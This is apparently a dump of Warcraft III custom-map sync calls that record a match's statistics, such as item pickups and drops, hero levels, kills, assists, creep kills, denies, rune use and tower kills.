	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895385);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895385);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895879);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227900739);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227900994);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "Level4", 11);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896131);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "Level4", 10);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227895894);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227902028);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895861);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902028);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902028);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895375);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "Level6", 8);
	SendSyncDat("dr.x", "Data", "Level6", 5);
	SendSyncDat("dr.x", "Data", "Level6", 2);
	SendSyncDat("dr.x", "Data", "Level4", 4);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227903796);
	SendSyncDat("dr.x", "Data", "Level5", 7);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227902028);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227902028);
	SendSyncDat("dr.x", "Data", "Hero3", 8);
	SendSyncDat("dr.x", "Data", "Assist7", 3);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896394);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227903025);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895375);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "RuneUse6", 5);
	SendSyncDat("dr.x", "Data", "PUI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse5", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "Level5", 1);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227903796);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227900739);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227903796);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227900739);
	SendSyncDat("dr.x", "Data", "Hero1", 10);
	SendSyncDat("dr.x", "Data", "Level5", 10);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "Level7", 8);
	SendSyncDat("dr.x", "Data", "CSK1", 10);
	SendSyncDat("dr.x", "Data", "CSD1", 4);
	SendSyncDat("dr.x", "Data", "NK1", 0);
	SendSyncDat("dr.x", "Data", "CSK7", 15);
	SendSyncDat("dr.x", "Data", "CSD7", 2);
	SendSyncDat("dr.x", "Data", "NK7", 0);
	SendSyncDat("dr.x", "Data", "CSK2", 23);
	SendSyncDat("dr.x", "Data", "CSD2", 4);
	SendSyncDat("dr.x", "Data", "NK2", 0);
	SendSyncDat("dr.x", "Data", "CSK8", 20);
	SendSyncDat("dr.x", "Data", "CSD8", 1);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 22);
	SendSyncDat("dr.x", "Data", "CSD3", 4);
	SendSyncDat("dr.x", "Data", "NK3", 0);
	SendSyncDat("dr.x", "Data", "CSK9", 13);
	SendSyncDat("dr.x", "Data", "CSD9", 2);
	SendSyncDat("dr.x", "Data", "NK9", 0);
	SendSyncDat("dr.x", "Data", "CSK4", 0);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 20);
	SendSyncDat("dr.x", "Data", "CSK10", 0);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 16);
	SendSyncDat("dr.x", "Data", "CSD5", 4);
	SendSyncDat("dr.x", "Data", "NK5", 0);
	SendSyncDat("dr.x", "Data", "CSK11", 14);
	SendSyncDat("dr.x", "Data", "CSD11", 3);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "Level5", 3);
	SendSyncDat("dr.x", "Data", "Level7", 2);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895894);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227902537);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227895863);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227902512);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896134);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "Level5", 11);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896132);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895861);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895861);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227900746);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896134);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896132);
	SendSyncDat("dr.x", "Data", "Hero8", 5);
	SendSyncDat("dr.x", "Data", "Level7", 5);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "Level5", 9);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "Level8", 5);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227902028);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227902028);
	SendSyncDat("dr.x", "Data", "Level5", 4);
	SendSyncDat("dr.x", "Data", "Level6", 7);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "Level6", 3);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227903796);
	SendSyncDat("dr.x", "Data", "Hero2", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 2);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895375);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "Level7", 7);
	SendSyncDat("dr.x", "Data", "Hero4", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 4);
	SendSyncDat("dr.x", "Data", "Assist11", 4);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896137);
	SendSyncDat("dr.x", "Data", "Hero9", 3);
	SendSyncDat("dr.x", "Data", "Hero3", 7);
	SendSyncDat("dr.x", "Data", "Assist9", 3);
	SendSyncDat("dr.x", "Data", "Level8", 8);
	SendSyncDat("dr.x", "Data", "RuneUse2", 5);
	SendSyncDat("dr.x", "Data", "PUI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 0);
	SendSyncDat("dr.x", "Data", "PUI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895861);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "Level8", 7);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227901782);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227901782);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227901785);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895894);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895893);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895898);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227900739);
	SendSyncDat("dr.x", "Data", "PUI_7", 0);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227900994);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "Level6", 1);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895893);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895893);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227903025);
	SendSyncDat("dr.x", "Data", "Level6", 10);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896134);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227903025);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227903028);
	SendSyncDat("dr.x", "Data", "Level6", 4);
	SendSyncDat("dr.x", "Data", "Level6", 11);
	SendSyncDat("dr.x", "Data", "Hero9", 5);
	SendSyncDat("dr.x", "Data", "Level8", 2);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "Tower110", 2);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "Hero2", 10);
	SendSyncDat("dr.x", "Data", "Assist7", 2);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895888);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "Hero1", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 1);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896134);
	SendSyncDat("dr.x", "Data", "Hero11", 4);
	SendSyncDat("dr.x", "Data", "Assist5", 11);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895376);
	SendSyncDat("dr.x", "Data", "Level7", 4);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "CSK1", 17);
	SendSyncDat("dr.x", "Data", "CSD1", 5);
	SendSyncDat("dr.x", "Data", "NK1", 0);
	SendSyncDat("dr.x", "Data", "CSK7", 22);
	SendSyncDat("dr.x", "Data", "CSD7", 2);
	SendSyncDat("dr.x", "Data", "NK7", 0);
	SendSyncDat("dr.x", "Data", "CSK2", 32);
	SendSyncDat("dr.x", "Data", "CSD2", 4);
	SendSyncDat("dr.x", "Data", "NK2", 0);
	SendSyncDat("dr.x", "Data", "CSK8", 32);
	SendSyncDat("dr.x", "Data", "CSD8", 1);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 29);
	SendSyncDat("dr.x", "Data", "CSD3", 5);
	SendSyncDat("dr.x", "Data", "NK3", 0);
	SendSyncDat("dr.x", "Data", "CSK9", 15);
	SendSyncDat("dr.x", "Data", "CSD9", 2);
	SendSyncDat("dr.x", "Data", "NK9", 0);
	SendSyncDat("dr.x", "Data", "CSK4", 8);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 23);
	SendSyncDat("dr.x", "Data", "CSK10", 3);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 27);
	SendSyncDat("dr.x", "Data", "CSD5", 5);
	SendSyncDat("dr.x", "Data", "NK5", 0);
	SendSyncDat("dr.x", "Data", "CSK11", 23);
	SendSyncDat("dr.x", "Data", "CSD11", 3);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227895861);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895861);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227900746);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227901010);
	SendSyncDat("dr.x", "Data", "Level7", 10);
	SendSyncDat("dr.x", "Data", "Hero3", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 3);
	SendSyncDat("dr.x", "Data", "Assist10", 3);
	SendSyncDat("dr.x", "Data", "Hero1", 10);
	SendSyncDat("dr.x", "Data", "Assist7", 1);
	SendSyncDat("dr.x", "Data", "Assist8", 1);
	SendSyncDat("dr.x", "Data", "Assist9", 1);
	SendSyncDat("dr.x", "Data", "Level9", 7);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895376);
	SendSyncDat("dr.x", "Data", "DRI_11", 1227895376);
	SendSyncDat("dr.x", "Data", "DRI_11", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895378);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895380);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227896137);
	SendSyncDat("dr.x", "Data", "Level6", 9);
	SendSyncDat("dr.x", "Data", "DRI_11", 1227896137);
	SendSyncDat("dr.x", "Data", "RuneUse6", 2);
	SendSyncDat("dr.x", "Data", "PUI_2", 0);
	SendSyncDat("dr.x", "Data", "DRI_2", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903796);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895898);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "RuneUse5", 5);
	SendSyncDat("dr.x", "Data", "PUI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 0);
	SendSyncDat("dr.x", "Data", "PUI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 0);
	SendSyncDat("dr.x", "Data", "Level7", 11);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "Tower111", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227901785);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896132);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896132);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227902265);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "Level9", 8);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "Level7", 3);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900994);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895376);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895376);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895859);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896153);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227895376);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895378);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895380);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227903818);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227903818);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227903818);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "Level9", 2);
	SendSyncDat("dr.x", "Data", "Level8", 10);
	SendSyncDat("dr.x", "Data", "RuneUse1", 11);
	SendSyncDat("dr.x", "Data", "PUI_11", 0);
	SendSyncDat("dr.x", "Data", "DRI_11", 0);
	SendSyncDat("dr.x", "Data", "PUI_11", 0);
	SendSyncDat("dr.x", "Data", "DRI_11", 0);
	SendSyncDat("dr.x", "Data", "RuneUse6", 3);
	SendSyncDat("dr.x", "Data", "PUI_3", 0);
	SendSyncDat("dr.x", "Data", "DRI_3", 0);
	SendSyncDat("dr.x", "Data", "Level9", 5);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "Hero3", 8);
	SendSyncDat("dr.x", "Data", "Assist7", 3);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "Level10", 7);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "Tower112", 2);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227903818);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896136);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "Level8", 4);
	SendSyncDat("dr.x", "Data", "Level7", 1);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
